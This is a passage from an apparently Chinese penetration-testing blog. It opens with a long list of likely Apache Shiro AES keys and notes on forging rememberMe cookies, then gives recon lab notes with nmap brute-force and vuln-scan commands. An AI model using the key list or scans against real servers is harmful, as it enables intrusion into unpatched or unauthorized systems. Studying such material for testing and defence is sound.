V0FeLDDwgn/lHh8QjTWA==<br>aXwaLrDY+DnSYjqCrtw20Q==<br>abnN7qNyMxHnyUA095KarQ==<br>ahXsyYVHYtAtoG0U3AZZ7g==<br>ake4Fho0TPLiTc6+Mw+eGw==<br>akw6fJ/MXENxwpIh0w4Dvg==<br>arnCyNG11LS/XMjF5ckKDw==<br>asImMWVQomqFU234+PmaSA==<br>atn+sDJtu2lGpKqWAMTBhA==<br>ayRW9VUXsAnbPbVStLcITQ==<br>bAs99sjQCdrGkX5Q01bWEw==<br>bxZQGR7TDAigQizh9lH2JA==<br>c0qQHzrRa/T8Mf0l6H+90A==<br>c6Uc0HTa7k4fvkFCkuJITg==<br>cHHr+Qpi+Xi3e7VGRugddg==<br>cTHiZHEszKKag1lKa+mKvQ==<br>caYIJ4PKftngqyIg8+YN9Q==<br>cbFPIbyf4mlv02MzHgF2rw==<br>clKY0Cx5neyUezjY0SwEuQ==<br>clZhrCN1I+VbFCGNsVkEiA==<br>cntMsMivwe4IsnWHA8ojtw==<br>cqEY26TR40vtmcgLtzXuEg==<br>ctatwWPonT9asCD1Xd9/5A==<br>czI1Pc0ajoTUrfmGsCQUjw==<br>d+jQ30vufpb5+lUYjT1nYQ==<br>d3LMihVDcI4fwxwocmTEvw==<br>d8Hmf7jfowPbnkiefDb+Sw==<br>dBdeu+9+OnBBxpGvRPjJ/Q==<br>dCOWshdJwFAcf+qLwUe/HA==<br>dJOhN2Hz3SB/K08rOWQ07A==<br>dKQgJQM/SEXIv3D2U2BLLQ==<br>dQs2xTXT3f86W6Ga2xjRTw==<br>dSElt4CZVAf7mXQlIQGgdg==<br>dhbQJptL7bP3elOzvRoBZA==<br>dkwe6n4PPAcRMmZhBG6uAg==<br>dsesfswfjn23409isfadAA==<br>duvI/5lJBm1p16InaO2IHg==<br>dv23QPiv17KhKxPYw+LaqQ==<br>dxvOQklgvjWQsaVmVqqDag==<br>e+hNRfVOpEuNI0Tz2/Z1zQ==<br>e3xEI91uMej9kMVoR3O6cA==<br>e8tyr9KH+eQDjYoNe5uISA==<br>eDDcywsTQLgD0jv8txgfgA==<br>eF49VEaI7nzFubJ/1YMW3Q==<br>eIBmReoHnQE8QpezBg96LQ==<br>eIbVurGQwMcwBwibhdCStQ==<br>eKAtvlkS4Sg0P3WtWq/CFQ==<br>eLAPYEnxRxv1y7YmUaMS7Q==<br>ePD6C5YhbaRlOxi5IzBiNA==<br>eQenOR0MiUdqVp2q6EzVfg==<br>eRAI4qw17Gk7TC2e7270fQ==<br>eVNnrlql+ozZQvxznwyRwg==<br>eZiC1NLcP3ZF2j4s0/TtVw==<br>ecZIaXxIP4GAFlSQJhnM/Q==<br>eg4ExfXBIlIqaBsXP+uiKg==<br>emRdeAprDZ7u9RmpvuCI6g==<br>enpyX2Nvb2tpZV9rZXkAAA==<br>epslfB+UfHbGKJBHxoW5aA==<br>eqqH7Afdc/joWJiKqrY9Ng==<br>esIFhH1i4dluPefLq9YuMQ==<br>etVIWI1LRDu5U5Y4rM8MAg==<br>f16qEEBy1ifeiozjYXU9kA==<br>f5KSsKNlnWsAuGQEfTqF9w==<br>fAOhaWOz5eVekXl7a0YeKQ==<br>fAjy5xG9sDVid3AWBUB0pA==<br>fMAUSJqC/zJOEZOodWvJhw==<br>fcq+/xW488hMTCD+cmJ3aq==<br>fgeqMjT3DZHUqKQCKToWXg==<br>fjL4Z8Pswu5nue712ux6Fw==<br>fkPzDy46ixPw5E7rtuujew==<br>fmwUQnLYgDRIWz5vTdbKRA==<br>fyky+G+P8/XRX3CFuMe70w==<br>g505NhJYIOupAmEjw5ddEw==<br>g5ewm7WJc2sUnkDY6SLj5g==<br>gDPjdNSA72TtGlY09QYgcg==<br>gGVVrU3tHXvKK9AcixHe+A==<br>gLGnrqn2l3kYhE1d+rYrbQ==<br>gNWb+Qi2C/qF/F1jcWRnhw==<br>gUL0C3OU+Q9UgKqp3scoag==<br>gWMaJL5DD6zDGn+g8sLEig==<br>gXeVotXfQ/3sVgU3QNGu3A==<br>gagDOciQ8Vu+zRC2dD2RaA==<br>gdsEc/5SDdlZCrhksvq1/w==<br>gh/TCYN93/Rimgv02O0OtA==<br>gm7XujoeC7Lr5XtlNTg0mg==<br>gorTaGLZin0diS0pubIsFw==<br>gp32s2iKKrxe3gjx/+Zb+w==<br>gscO3vAVprs2KAgKZfLeEQ==<br>h/okoqkglVxuGA0iJz5c+w==<br>h2q1et6Po90LAKzq3pRwUg==<br>h3G6nJ8DogwWJwbJke0BuA==<br>hJ5zAP4V5V8QCrtQJ0BdEw==<br>hJmIqflinJiougKHjf6/gQ==<br>hLeds76xCNsWaT0cDs6z8w==<br>hQ4ZfMNvm9QpbUkUZ245Ng==<br>hQPaEAp+Uz/lIGTZ4nEnAA==<br>hYK4jrzaDud+R73c8OOKew==<br>hh2eycp1zprStKiXC8G7Ug==<br>hi6igx3kZ3kzKrp2awOxUw==<br>hkvPHf5hKr+0bu1NLNvuKw==<br>hnQ6/3gOdsxBM/J+TQ+h3g==<br>hnZ0xb7t7ATtlqQve94CaA==<br>hqFmMAqTUXHmsLvsAaFWOw==<br>hydjS5HItmn/8WT8sofTiQ==<br>i4f61DGtOvM1kup49TdUXw==<br>i9a9F0BgCJT5JicwPaH6rw==<br>i9grFjucwAtKd153/qIIqg==<br>iBmetixJnj3rXIx+NxtKEg==<br>iJBpbYLrFFdTVwkegX2zTA==<br>iKi0XKxsivI728hyUbNv9Q==<br>iKygDyKEQ+RBHNV1tipHkg==<br>iLj7EOWlNryTsqekWcZaSg==<br>iOT+QKetxw4ZMBes438nYw==<br>iPkbVi+dhsykLmnvR1GiwQ==<br>iTLtyiWRiqye9GWlh46wEg==<br>ig295VyXfcr7WjYatMZGzg==<br>ivazQmxWOmBExSIpF1J9sQ==<br>j/XRd0lirr08bFIgBvS/wQ==<br>j7PNUBNq7qkfcPWU/tXauQ==<br>jJZ4j/xjSQxWtngCk52e1Q==<br>jNbcLmxTzydpF1DHOhhxyQ==<br>jO6Do3PKndQb3DVPQuLf0A==<br>jcrU8WDhgrth1FdRnwsklw==<br>jeoq9Gpi/YnSyIFq97Ldkg==<br>jjYTxI4L+KCuuJZqHq0x1Q==<br>jpcVaBhNkx7MS1SxRecpmg==<br>jpkjzDBNhdCe82Gigv3qOw==<br>jqdfJBP9tITnYZKxXU1CDg==<br>jw2r2XPI4j4OLFDYtD2Rtw==<br>jwgaFzdpReuEuPkkown+EA==<br>jx1IcFTh6W2atCS/Bc6t/w==<br>k3eHFlm5B8vqOSRwvxKTgw==<br>kCCaUwSKJ86Yd51edXFa0w==<br>kF5zCKYapekD1nfECd6ZnA==<br>kFZz7FHqbXBmYS1NW/8cWQ==<br>kKKRmFDe0Ji9g5AdJ3apcA==<br>kKYxEOWn0H5+YNlfX7IObA==<br>kN2OaR5TqldmZlrcHqDnZA==<br>kPv59vyqzj00x11LXJZTjA==<br>kYB5/1U8tcXXof88H8xPlA==<br>keTRMjLlMXCLFDnIqztsoQ==<br>khEcHvSJbAUPM/pIyK9mPw==<br>kqTJCp1featbhyw7jTFYYw==<br>kv58wnIjGD/z8oOrD7u//w==<br>kvehJmOhxUH28P3Fqxd3TQ==<br>kxOUUaWSF4AL6r8DvkfOOg==<br>l6NgJ0Cx3EQypphGotpi5g==<br>l8UXW+AoYklIH7we3bAXIg==<br>l8gw/I0XGAljwxThcoc4xw==<br>lAOnKOpdoUY1UNhmfTPGdw==<br>lKAvKzqZizqW6NIKXznH6A==<br>lOwFgM/dqZXXBxaqaby7sQ==<br>ld/TklCGmgoKjASiaZO4Vg==<br>lpqAaZD3J+4O/qFz4OmPrA==<br>ltOUZ4rRGyU5N+NOgSj41g==<br>m05ZZ9L4jjQXn7MREpb7AA==<br>m8QW9x8efj+drr+BlCcz9A==<br>mLA5w3x7Snh+IpB93uhEUw==<br>mRfrdiNj7616ZfHZ1GGgzw==<br>mSfK3eJLpnu10P4EJCOptg==<br>mXFxXYeWJk9VlusBnG4O8Q==<br>mY7wtxGTzm45WjekUJ/8jA==<br>mZF/GuHb8Ru01c4AqhcUKA==<br>mbPOU6Bicp+qfM40ZtCtew==<br>mkdlTv+aEXnrrn9aF8djwQ==<br>mt1dfvEhxJ5iCG0XAKwXtw==<br>mwTvS9wftMmeo/VCLhhD7Q==<br>n/H/9WotS/XT7xCChs2WLQ==<br>n8T5hZWHAj1K8XTbt4qbNQ==<br>nP3VFneEItDmYUwme2842Q==<br>nYlUKrxAB6geGRVWkxMOSw==<br>nfvFo4PjKBkLiTEpo3APHw==<br>nixWQpJdDKLAxpEwjlmFiQ==<br>nlBYYjIH6ROTrOo8bUaSjw==<br>nlDRTKndpcIXZD/+ZnSbWQ==<br>nx12iAW12CkB4R/KsijG2A==<br>nxfo1oYcJCo1knGwEiFMWg==<br>o+x6Hu8oT3P+/v0wrLM2Qw==<br>o0JRyHDliwkfVGLlBBFXZg==<br>oGAJj5ptvxn+fePc7p12Rw==<br>oOb9pJBSAdWN7lhifj3sLQ==<br>oPYfpwZrE5YZqV7kQtDaGw==<br>oPgANeWJACdwQd4NJ1zHKw==<br>oT4m6z+gd+Qj0ZBz1RZ5qg==<br>oX/XTCGgj2bIVBr4TEwzEg==<br>ob7j+RFt0AYRlj80VVdRyg==<br>odfMvPFeBz8CkTGcrIvdFg==<br>oeOAqlwsz7YGh/IqqhQ+Jw==<br>oektKzqtSu8kpqcsS2Sg4g==<br>ofjz4Ln/Wl7FuMC9Vg19mA==<br>ok14FnCz9IltBii+BiXveg==<br>ok8wssACq+UGPk78xx69fA==<br>osJ0HzCBt5/Y0umy+9Qqaw==<br>otifL/3x7EznbJPnyZ+ECQ==<br>ouaD8k/vPrj3ciMATK+2/w==<br>oy8ELUj/VgzlCNdWf3h//Q==<br>p3dp8ojPX4R0GRMVeSAd4Q==<br>p5BESMRL9wyZ1oj7B6geHg==<br>p6bIYZCynq7cXFFrdGAl1Q==<br>p7NcX6q0slluQCAWEGdwVQ==<br>pKLt7P9oogEfSc77KEQoZQ==<br>pLed3YBRRIhitK3C8+PxHA==<br>pSj0ujKIu9rqWE6KiqkXwQ==<br>pSnUw0ykd+COIvsJGFq3rg==<br>paVp5kn5aOLQwNXf4XIBjQ==<br>pcJOpNekDJEtXIFb7TeU8g==<br>phDoODMycFSFCdBTTmDxNQ==<br>pnAyV1S2EggTG1uJqbGomw==<br>prx0GOkoatLNrtYIbfoPxQ==<br>psEX/kWfxE0INGre8QDHDw==<br>pvXSm7Eh4i0LqULmcFyUhw==<br>q4rYOgVnG2Qi+yYQZgprew==<br>qIhbwUpNl6YUe+gjPP/NEg==<br>qJnaEQtpTumShsoEBPTS/w==<br>qKfduuy+f7TW8BnOJuZeHw==<br>qMEzyGxs6PcHCe16m+DZKA==<br>qMQfy3WOiHLyYkzcXpNsLA==<br>qPr9FPiu5Vu+6soaD2W9Rw==<br>qTxK2Riqb0nIq02mZ30Y2A==<br>qUbzSwjhBfAWpOiOugYe5w==<br>qajDHDT91DFjQvf+vZR7Kw==<br>qvi4m0lRfl0Zizk5ip1r5A==<br>r20flUTNuoVqV3fnJsMUwg==<br>r89fpQXp13fmF4kzUfDuoA==<br>r8eg47skSEyfA2btmErRQQ==<br>rD03BQk2kdBkqqNNL+HWVA==<br>rDzITdJ0ayTaG3S1pulFxQ==<br>rE7cQLcfrjoHVUhU31kALw==<br>rEXZ5oHbZOKgs2MBJdTkEA==<br>rFLib6x+ktTecvkpxt6OFg==<br>rGbM1vT+zLmRqThyn/VIwQ==<br>rMe6KnHoN/7M1YE/EPRhhQ==<br>rOR/3TpLLCVwLC7l07r90Q==<br>rOvHadwM8KttfSOi/q1Pvw==<br>rQQKRPVmmpIQ8cljFPHIYQ==<br>rQc3dKkwP45hAb2pXHnM/A==<br>rVeaKPC//gvovFD1If4nHg==<br>rVnuqPTlXkEtQR0CsdxV9w==<br>rXLUcoImJP8RBgP8L64uGQ==<br>ra/xC+nrOTuI/vPdLYfpGQ==<br>ran5rq7YzA6hG7wQTZsP6Q==<br>rcuaIKtKMQbZh9O+LQ0y9A==<br>rdHI8JgsiklSqDiHj6FTPg==<br>rdOa2Brixuhnc+K2+lcNFw==<br>ri7bl4Q32mnFLX4HyqJyYQ==<br>rvovJeBXWeI4ohSPNnfzjw==<br>s/wTft5+uSaONMF3vnlZkw==<br>s2mFzuS3Cw985oS++umoGQ==<br>s9h9uiscldRNfCNy672Xfg==<br>sAcbMSdf2dz4hBtz+uKGsg==<br>sBCqEOwraWJEHpOJjWPU4w==<br>sBZ+y0i5UfLmLwf5EjXHlg==<br>sFTAHkio5ljbhBxWWiDh+Q==<br>sGhc4rkEcYumNA8WahqwJg==<br>sIfaz3uuv/KpmCp70W/gwQ==<br>sNr3NaS3o58cvxyL6tC5WA==<br>sZ6glnU252P46aeK1qEQog==<br>sdodasF2xI446mVp5UIM2A==<br>sfXaK7Slf0qPeQNEi7jK8Q==<br>siHt7SxnHhaI86OIrArMwA==<br>slnGASPnV2E1ZDCU8Yrd0Q==<br>srNnRz3w7RBWKCU/zjTmYw==<br>sy05dMAiiJtLfoCo29xjrg==<br>t41dczuACfHuZK1tckv/5Q==<br>t50cFSIgZ9c/86OCrZ8X7w==<br>tDxnIAIcal1pg0ajWxI56A==<br>tEOJKNEX+Q/FthUWNLwxOw==<br>tFHEWD1iAftKlAO+h7FrWA==<br>tQa31QsLrMT3gp3EjMu4Vw==<br>tTDwW0Tn4cQQcp8Qu23ZTQ==<br>tVWukoRTPhoMyRHJ0Verfw==<br>tW0NnDW8fP83y5Q5HMr6ew==<br>tXdQr43/fZpfP3LT0dWgIQ==<br>tfYteaCxNqGoDe5WGPKHBQ==<br>tiNQp1lwJCnEvU4CsZoDjw==<br>tpXDa3rd1T8Is3Esk6774A==<br>tuPBaCh7xvo/aaqL3dbw6g==<br>u6jFX/puCoaWgj605jG2Aw==<br>uA/LpLw5VGa5ZAOYlKqFYg==<br>uEqDzVoHwFd6bOmWF5mfkA==<br>uHDj/ApSuPah0ATdmFtneQ==<br>uQq7qzqMdTkReRclk/vg3w==<br>uXCDAhHvZ2Xi2JrMQPHz0w==<br>ueLnhDgNYs0l6CNY2ie0HA==<br>uiZDeD9f999GmetIA4wspw==<br>uizChCzf7D4gHr7cYhJysg==<br>uppV9kZeD8kihlYY+VAGCQ==<br>uvZe+X2+GyV/zzgVdNOUyw==<br>v4M2sMhcxz5zXpWst9LxDg==<br>v4nkwWOqi6gO4pTD1kwdXg==<br>v6J1Z6oJcUCCJeg/U7q4qA==<br>v9hbbr19KYfwYMODGS4fVQ==<br>vIFcqWLpL5sZN0NKuRRLcA==<br>vKjf7jtnLVzKlpiEBj6g6g==<br>vY2CPWf08YvTlxHZHxJB5g==<br>vYFLuRvchlgmo3fWMEAVOA==<br>vzKf4la46A+sdpblFEn60A==<br>w2vMYewyr+KXmNlv39XEEQ==<br>wH1KOSuiv7Kn6GeNVZ9+7w==<br>wMa+wwDpXgJwyjrqQGre5Q==<br>wRTQp0M40hcUq6p22x6DNQ==<br>wY5M5k/cJ5cd8Scms+Ivvw==<br>wgMkUJ0+IHKwc163fwW6WQ==<br>wpKnsDvV7zzReQSmY05Jfw==<br>wyY0puJrynwfuBoX/5SfXg==<br>x5RT17zr46N4v32uMGoT7Q==<br>x8OUddV52M1sD2iX1TgwPQ==<br>xY/Py8rrXpIaiP5DYHKHJQ==<br>xaOWanZ5FMwjZLcg3OkZpg==<br>xfHhfJa8H2fhxb70d4wPhg==<br>xliLxYKmWp7FdJDTvR64aw==<br>xvhzjL0Dz3zX0J5H6+G7mw==<br>xxOUGpTHB6ZL6FcjXxNmZg==<br>y+iKxEfLmoz/46fcMdne5g==<br>y+lrzDXb0bQi74d7a2YsoA==<br>y9N/A+XzRNmFhBSJMnwtew==<br>yWz42JvzwNDc/xifdSINLA==<br>yg8tW9kDLR7wzoSLvPwvwg==<br>ygJw7ry1XevpnCys1hOmZg==<br>ykFi595/Fl04fJ2xuBYwYw==<br>yl3gvDmII9F74JQSaPUuIA==<br>ypb2mLD/Y9ZF4LlsPGRJUw==<br>ys6irM6SToSvJtWOfere4Q==<br>yunQrhFO8OmTyUwFz/OCVA==<br>ywM+CNdZoaXVGX9ybf9btQ==<br>z4rUCB8E9U71fFOwh//GjA==<br>z9Pdt1YVDM+4O0qjVSMz1g==<br>zC8aC11AVNa1g3rHB5p8tg==<br>zFz5Hu1NTuGLNZfmmPRUuQ==<br>zGB+ygayX4v8GHrp/vYOyg==<br>zGTO3faB2+62LU9ZV81b8w==<br>zH+m8pQ49HUq3Ru7Oym9/w==<br>zKi5alGrBnK0lWU0rLZfrQ==<br>zWbMTzTmFtUVciUE3Yo2Xg==<br>zZG0cSIvFgY83wrVLVYj/w==<br>zcR8SLYBJFyOknQxqW46Hg==<br>zfDkwwF9ydiIbXTMxRaHGA==<br>znJ984VkEEKwW5ZbbCYd0Q==<br>zx9DvPzTSauVSdn2XDWIdg==<br>zy1KJFZ6eucDxK6nGW0xcQ==<br>lxuEtAWbv+SgUOXREM+zrA==<br>2AvVhdDFCVdfdfDFAdag==<br>Kyjwds5ZLEBUhA4a9O1DhQ==<br>4AvVhmFLUs0KTA3Kpr3sd3ag==<br>ikB3y6O9BpimrZLB3rca0w==<br>6GvVhmFLUs0KTA3Kprsdag==<br>6Df5w6FRPCVQV0dhhUrZZ<br>2AvHhdsgUs0F0A3SDFAPa==<br>7gzYfKjTASKdsai43ds==<br>LafjwUgsDlNmnet47IJQWg==<br>2AvHhdsgUs0F0A3SDFAPa*==<br>pMvTx48hLt+/C8D+cM5vR==<br>zzrsUhmFL9Ks0KTLUsvV4AAdzz==<br>dG91dGlhbzEyMzQ1Ng==<br>2AvVhdUs0FSA3SDFAdag==<br>AvVhmFLUs0KTA3Kprsdag==<br>WWFuemhlbmcg5Lil5q2jAA==<br>W2h5bXNdY29va2llQA==<br>dG91dGlhbzEyMzQ1NQ==<br>dWZkbXBhc3MxMjM0NTY3OA==<br>9Jo0hLz8XhDpPsOOYOnSUA==<br>bT3ovvD7RfGDc0BXO5ORyA==<br>1t43gns419h1g61dpnpfe<br>4AvVhmFLUsOKTA3Kprsdg==<br>UFz8ias3ZKYzku/ZUuG9yw==<br>P7sWnbtUYuVxgVFvFlHpvQ==<br>k3+XHEg6D8tb2mGm7VJ3nQ==<br>GhMXBsUK/105DRCJvsCt/A==<br>ZGdmdwAAAAAAAAAAAAAAAA==<br>6Df5w6FRPCVQV0dhhUrZ*Z<br>Us0KvVhTprsAm43KFLAdag==<br>bQY8T1A6hrHOfQrg0mv7Eg==<br>bSqtfpTeQHIOOKKjugqPjg==<br>blyGEQEhBYYVjrzAzP30GQ==<br>btQuG8vtGbZsLFZH88e//A==<br>2weDYcR3DPa6nf8Z42d2XQ==<br></code></pre></td></tr></table></figure><p>  payload产生的过程</p><blockquote><p>命令 &#x3D;&gt; 序列化 &#x3D;&gt; AES加密 &#x3D;&gt; base64编码 &#x3D;&gt; RememberMe Cookie值</p></blockquote><p>  所以我们只要得到aes加密的密钥，就可以构造payload</p><blockquote><p>任意http请求中 cookie 处rememberMe参数</p></blockquote><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/shiro/image-20230831220206094.png" alt="image-20230831220206094"></p><p>  特征判断</p><blockquote><p>返回包中包含 rememberMe&#x3D;deleteMe 字段，认证失败时会设置 deleteMe 的 cookie</p></blockquote><blockquote><p>Set-Cookie: rememberMe&#x3D;deleteMe; Path&#x3D;&#x2F;; Max-Age&#x3D;0;</p></blockquote><p>  影响版本</p><blockquote><p>Apache Shiro &lt;&#x3D; 1.2.4（需要获取AES秘钥）</p></blockquote><p>  利用组件</p><blockquote><p>Apache Shiro &lt;&#x3D; 1.2.4（需要获取AES秘钥）</p></blockquote><p>  payload 构建</p><blockquote><p>命令 &#x3D;&gt; 序列化 &#x3D;&gt; AES加密 &#x3D;&gt; base64编码 &#x3D;&gt; RememberMe Cookie 值</p></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验</title>
    <link href="/2023/08/20/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/"/>
    <url>/2023/08/20/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验学习域名查询IP和IP反查域名，了解什么是CDN，通过判断是否存在CDN来查找CDN背后的真实IP，学习旁注和C段嗅探。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>无特殊要求，能访问互联网即可。</p><h2 id="实验步骤一"><a href="#实验步骤一" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：域名查询IP和IP反查域名。</strong></p><ol><li><p>域名查询ip:</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820235747511.png" alt="image-20230820235747511"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821000127195.png" alt="image-20230821000127195"></p><p>可见，同一个域名，访问出了两个IP地址</p></li><li><p>IP-&gt;域名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821000342505.png" alt="image-20230821000342505"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821000404898.png" alt="image-20230821000404898"></p></li></ol><h2 id="实验步骤二"><a href="#实验步骤二" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：探测IP真实性：判断是否存在CDN—&gt;查找CDN背后的真实IP。</strong></p><ol><li><p>检测的方法</p><ul><li><p>多地ping</p><p>判断是否存在CDN可以使用ping方法，在不同的地区ping同一个域名，查看对应IP地址是否唯一，如果不唯一多半是使用了CDN。</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>多地ping包括了外国ping</p></li></ul></li><li><p>查询子域名的IP</p></li><li><p>查询历史DNS记录中可能存在的使用CDN前的记录</p><ul><li><p>解析目标域名的AAAA记录</p><p><a href="https://github.com/blechschmidt/massdns">https://github.com/blechschmidt/massdns</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>然后输出hetianlab.txt<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>包括了解析器IP地址，以便在检测到某些解析器产生不良结果时便于过滤输出。</p><p>dnsenum：查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求、通过谷歌脚本得到扩展域名信息、提取子域名并查询、计算C类地址并执行whois查询、把地址段写入文件。</p><blockquote><p>dnsenum hetianlab.com -v </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821011319261.png" alt="image-20230821011319261"></p></li></ul></li></ol><h2 id="实验步骤三"><a href="#实验步骤三" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p><strong>任务描述：旁注和C段嗅探</strong></p><ol><li><p>使用bannerscan进行C段BANNER与路径的扫描</p><p><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/IP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ol><h1 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h1><h2 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验学习端口扫描的常用方法，利用相关工具检测服务器或指定IP段的端口开放情况。</p><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>无特殊要求，能访问互联网即可。</p><h2 id="实验步骤一-1"><a href="#实验步骤一-1" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：nmap工具简单介绍。</strong></p><ol><li><p>NetworkMapper（nmap），是一款开放源代码的网络探测和安全审核工具。手册地址：<a href="https://nmap.org/man/zh/">https://nmap.org/man/zh/</a></p><p>“所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 <code>open</code>(开放的)，<code>filtered</code>(被过滤的)， <code>closed</code>(关闭的)，或者<code>unfiltered</code>(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接&#x2F;报文。 <code>filtered</code>(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 <code>open</code>(开放的) 还是 <code>closed</code>(关闭的)。 <code>closed</code>(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。</p></li><li><p>nmap的功能</p><p>1）主机发现：检测网络存活主机</p><p>2）端口发现：检测主机开放端口</p><p>3）服务发现：检测相应端口软件及版本</p><p>4）检测操作系统、硬件地址</p><p>5）检测脆弱性漏洞</p></li><li><p>端口状态</p><p>1）open：端口开启、数据到达主机、有程序在端口上监控</p><p>2）closed：端口关闭、数据到达主机、没有程序在端口上监控</p><p>3）filtered：数据没有到达主机，返回结果为空，数据被防火墙或IDS（intrusiondetection system，入侵检测系统）过滤；</p><p>4）unfiltered：数据没有到达主机，且不能识别端口的当前状态</p></li><li><p>nmap的基础用法</p><ul><li><p>单一主机的扫描</p><blockquote><p>nmap 192.168.1.2</p></blockquote></li><li><p>子网扫描</p><blockquote><p>nmap 192.168.1.1&#x2F;24</p></blockquote><p><em><strong>&#x2F;24</strong></em>的意义是使用24位的子网掩码，就是所有的IP地址</p></li><li><p>多主机扫描</p><blockquote><p>nmap 192.168.1.2 192.168.1.5</p></blockquote><p>也就是添加多个ip地址</p></li><li><p>主机范围的扫描</p><blockquote><p>nmap 192.168.1.1-100</p></blockquote></li><li><p>使用表格扫描</p><blockquote><p>nmap -iL target.txt</p></blockquote></li></ul></li><li><p>nmap常用的命令</p><ul><li><p>系统漏洞检查</p><blockquote><p>nmap –script smb-check-vulns.nse -p ip</p></blockquote></li><li><p>数据库密码检查</p><blockquote><p>nmap –script&#x3D;brute ip</p></blockquote></li><li><p>收集目标的应用服务信息</p><blockquote><p>nmap -sC ip</p></blockquote></li><li><p>检查常用的漏洞</p><blockquote><p>nmap –script&#x3D;vuln ip</p></blockquote></li><li><p>检测应用的弱命令</p><blockquote><p>nmap –script&#x3D;auth</p></blockquote></li></ul></li></ol><h2 id="实验步骤二-1"><a href="#实验步骤二-1" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：其他端口信息收集工具简介。</strong></p><ol><li><p>masscan</p><ul><li><p>单端口扫描</p><blockquote><p>masscan ip -p port</p></blockquote></li><li><p>nmap功能</p><blockquote><p>masscan –nmap</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ul></li><li><p>scanPort</p><ul><li><p>指定端口号，扫描hetianlab.com的开放端口，使用1000个协程进行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li><li><p>指定IP范围，扫描192.168.78.1-255网段的端口80-10000：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ul></li><li><p>astsu</p><p>用Python3写的网络扫描仪。将TCP Syn数据包发送到已定义端口上的目标，如果该端口已打开，使用nmap扫描检查该端口上运行的服务，并打印找到的所有端口。</p><p><a href="https://github.com/ReddyyZ/astsu">https://github.com/ReddyyZ/astsu</a></p></li><li><p>第三方网站</p><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p></li></ol><h1 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p><strong>域名</strong></p><p>域名（domain 